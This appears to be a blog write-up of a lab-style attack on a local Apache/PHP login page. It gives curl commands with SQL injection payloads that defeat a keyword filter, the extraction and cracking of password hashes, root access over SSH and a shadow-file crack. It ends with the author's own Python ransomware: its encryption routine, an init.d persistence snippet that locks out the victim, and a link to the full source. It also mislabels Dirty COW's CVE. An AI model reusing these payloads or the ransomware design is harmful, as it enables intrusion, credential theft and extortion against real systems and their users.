+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token function">sudo</span> nmap -sC -sV -O -p10001 127.0.0.1
+PORT      STATE SERVICE VERSION
+10001/tcp <span class="token function">open</span>  http    Apache httpd 2.2.22 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span>
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.32
+OS details: Linux 2.6.32
+</code></pre>
+<p>We know the web-server is running on Apache 2.2.22.<br>
+The server on linux 2.6.32 (debian). This version is very old, and multiple exploits are likely to exist.</p>
+<p>Through my browser’s console, I try to identify what happens network side.<br>
+<img src="https://github.com/wurwur/wurwur.github.io/blob/main/post.png?raw=true" alt="POST Payload"><br>
+We notice that the payload is in the form:</p>
+<pre class=" language-json"><code class="prism  language-json"><span class="token punctuation">{</span><span class="token string">"email"</span><span class="token punctuation">:</span> email<span class="token punctuation">;</span>
+<span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">;</span> <span class="token punctuation">}</span>
+</code></pre>
+<p>This is all the recognition we might require. No need to start Burp or try any other scanning tools &amp; techniques.</p>
+<h2 id="detecting-and-exploiting-vulnerability">Detecting and Exploiting Vulnerability</h2>
+<p>As a first reflex, I run nikto:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> nikto -host localhost:10001
+</code></pre>
+<p>Nothing fancy here.</p>
+<p>I then try to send a single quote as a payload see how the server reacts.</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> curl -X POST --data <span class="token string">"email='"</span> 127.0.0.1:10001/login.php
+</code></pre>
+<p>And we can tell that an SQL Injection is present. The error message stands as a proof of concept of the SQLi.</p>
+<p>We try a very common SQLi injection…<br>
+<strong><code>or 1=1--</code></strong></p>
+<p>…but returns an error:<br>
+<code>There was an error running the query [...] near '11' and password='''</code></p>
+<p>However, we can notice something interesting: the returned data is not the same as our payload. We can safely assume that some kind of sanitization is in place. Now we need to figure out what kind of sanitization, and what are its limits.</p>
+<p>We try manually use CURL to send common SQL keywords, then check the error message to note which ones are getting deleted, and which ones are not.</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> curl -X POST --data <span class="token string">"email=example%40email.com'%20or%20and%20LIKE%20%3D%20%3C%3E%20%7C%20%2F%20%23%20*%20%2F*%20--%20UNION%20ALL%20SELECT"</span> 127.0.0.1:10001/login.php
+There was an error running the query <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span> near <span class="token string">'&lt;&gt; | / # * /*  UNION ALL '</span><span class="token punctuation">]</span>
+
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+</code></pre>
+<p>We end up gathering the following:</p>
+<p>The keywords that will result in sanitization are:</p>
+<ul>
+<li>OR,  AND, =, LIKE, SELECT, --, , , TRUE, FALSE, NOT</li>
+</ul>
+<p>Some of the allowed keywords are:</p>
+<ul>
+<li>&lt;&gt;, |, /, #, <em>, /</em>, (), (, ), UNION, ALL, +, -,</li>
+</ul>
+<p>We then notice that the sanitization process does not run recursively (how fortunate).<br>
+We can modify our sql injection to bypass the sanitization. For that purpose, we make a custom tampering python script which can be found here:</p>
+<h3 id="tamper.py">&gt;&gt;&gt; <a href="http://harm.root.sx/tamper.html">tamper.py</a></h3>
+<p>We have our new SQLi injection: <code>' oorr (1&lt;&gt;2) -=-</code> , after being tampered by our script.</p>
+<ul>
+<li>“or” has been doubled so that the inner on gets removed by sanitization, the outer split one remains</li>
+<li>“a=a” has been replaced with “a&lt;&gt;b”, which means “not equal”</li>
+<li>“–” required some creativity, but by appending a character that is also susceptible to sanitization, we can ensure the “–” remains in the final query.</li>
+</ul>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> curl -X POST --data <span class="token string">"email='OORR 1&lt;&gt;2 -=- "</span> 127.0.0.1:10001/login.php
+<span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span> Welcome amanda@seegson.com <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
+</code></pre>
+<p>And we’re in!<br>
+We’re logged as amanda, who I’m guessing is the first entry in the database.<br>
+So far, we only know amanda, but in the future, we can use this tweaked version of our SQLi to login as any “name”:<br>
+<code>' oorr (1&lt;&gt;2 anandd email LIKE '%NAME%') -=-</code></p>
+<p>Where we use “LIKE” as a replacement for “=”</p>
+<p>We try to login via SSH as amanda:MYSECRET, and we got a shell!</p>
+<p>It is now privilege escalation time :)</p>
+<h2 id="accessing">Accessing</h2>
+<p><code>cat /etc/passwd</code> and <code>ls ../</code> and gather the usernames of all existing users and homes.<br>
+New users are discovered:</p>
+<ul>
+<li>sara</li>
+<li>josiah</li>
+<li>sebastian</li>
+<li>william</li>
+</ul>
+<p>We see that josiah has root privilege.</p>
+<p>We download and run <a href="https://github.com/peass-ng/PEASS-ng/tree/master">linpeas.sh</a></p>
+<p>We find many possible valid exploits. Out of which the most critical:</p>
+<ul>
+<li><strong>Dirtycow (CVE-2013-2094)</strong>
+<blockquote>
+<p>PTRACE_POKEDATA “pokemon” method<br>
+Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3</p>
+</blockquote>
+</li>
+<li><strong>Perf_swevent (CVE-2013-2094)</strong>
+<blockquote>
+<p>Linux Kernel 3.2.0</p>
+</blockquote>
+</li>
+<li><strong>Futex (CVE-2014-3153)</strong>
+<blockquote>
+<p>Linux Seegson 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64 GNU/Linux</p>
+</blockquote>
+</li>
+<li><strong>Baron_samedit (CVE-2021-3156)</strong>
+<blockquote>
+<p>overwrite struct service_user w/ default /etc/nsswith.conf</p>
+</blockquote>
+</li>
+<li><strong>Sudoedit (CVE-2023-22809)</strong>
+<blockquote>
+<p>sudo version 1.8.5p2</p>
+</blockquote>
+</li>
+</ul>
+<p>From there:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> john <span class="token operator">&lt;</span> unshadow /etc/passwd /etc/shadow
+</code></pre>
+<p>All these exploits are readily available, can be exploited on the machine after some tweaking/static compiling.<br>
+But I wanted to find a more elegant way that didn’t require any big CVEs. So I went back to the web server and tried a few more things:</p>
+<p>Our goal is to dump the database through the injection. We know Josiah have an account on the webpage, that the webpage’s password is related to the ssh password and that Josiah has root access.</p>
+<p>We use try to aaim our SQLi towards the <code>UNION ALL</code> statements. We have come up with this:<br>
+<code>' || 1 &lt; 2 UNION ALL SELESELECTCT passwoorrd FROM login -=-</code><br>
+⇒<br>
+<code>There was an error running the query [The used SELECT statements have a different number of columns]</code></p>
+<p>So we have over 1 elements gathered from the query, which makes sense. We need <em>at least</em> 2 for the email/password.<br>
+As we cannot use the character “,” we make do with “join”, and append one of the clauses with <code>GROUP_CONCAT(passwoorrd) FROM login</code>.</p>
+<p>After some trial and error, we find this:<br>
+<code>' UNION ALL SELESELECTCT * FROM (SELESELECTCT NULL) a join (SELSELECTECT GROUP_CONCAT(passwoorrd) FROM login) b join (SELESELECTCT NULL) c -=-</code><br>
+This SQL injection returns in order all hashed passwords stored in the database. We try crackstation, and we get our cleartexts:<br>
+95815…  ⇒ MYSECRET<br>
+e00cf2…  ⇒ admin1<br>
+5b1b6… ⇒ 555555</p>
+<p>On SSH, josiah:admin1 and root:admin1 gives us root access.<br>
+From this point, we can grab /etc/shadow, access the mysql database with the password stored in cleartext in /var/www/login.php; or be evil and jump to the next category:</p>
+<h2 id="malware-infection">Malware Infection</h2>
+<p>This randomware requiers Pycryptodome. The depedency could be waved by adding hard implementations of AES and RSA.<br>
+The entire source code can be seen ONLINE at this adress:</p>
+<h3 id="online-view-of-malware.">&gt;&gt;&gt; <a href="http://harm.root.sx/malware.html">Online View of Malware</a>.</h3>
+<h3 id="a-python-ransomware">A Python Ransomware</h3>
+<p>The program follows a very specific routine:</p>
+<ol>
+<li>Ensure the program runs as sudo</li>
+<li>Generate a unique random id and a random key (using cryptographically suitable pseudo random number generation)<pre class=" language-py"><code class="prism  language-py"><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>secrets<span class="token punctuation">.</span>randbelow<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
+</code></pre>
+</li>
+<li>Gather the absolute path of all files in the /home directory
+<ul>
+<li>For every file: Encrypt it in AES ECB using the key</li>
+</ul>
+</li>
+<li>Encrypt the id/key combo using a hard-coded RSA public key</li>
+<li>Try sending the encrypted id/key combo to the attacker’s server
+<ul>
+<li>If 7. fails, store it locally (it is encrypted so it does not cause any real issue)</li>
+</ul>
+</li>
+<li>Create, configure and run a routine in /etc/init.d/ that will every second since boot (before logging):
+<ul>
+<li>Create a shell with a pre-defined command (effectively locking the victim out of their machine)</li>
+<li>Prints a message that tells the victim what is going on and what the next steps are if they wish to get the key</li>
+</ul>
+<pre class=" language-py"><code class="prism  language-py">    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/etc/init.d/kernel"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"chmod 777 /etc/init.d/kernel"</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"update-rc.d kernel defaults"</span><span class="token punctuation">)</span>
+    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"/etc/init.d/kernel start"</span><span class="token punctuation">)</span>
+</code></pre>
+</li>
+<li>Reboot, ensuring the user sees the init.d routine and that all traces in memory are purged<br>
+<img src="https://github.com/wurwur/wurwur.github.io/blob/main/chill.gif?raw=true" alt="VMware init.d/ autorun script showcase"></li>
+</ol>
+<h2 id="consequences">Consequences</h2>
+<p>The consequences for the company would be the following:</p>
+<ul>
+<li>Full data breach.</li>
+<li>System downtime</li>
+<li>Major final loss from the randomware and the downtime</li>
+<li>Major loss of trust from the public</li>
+</ul>
+
+    </div>
+  </div>
+</body>
+
+</html>
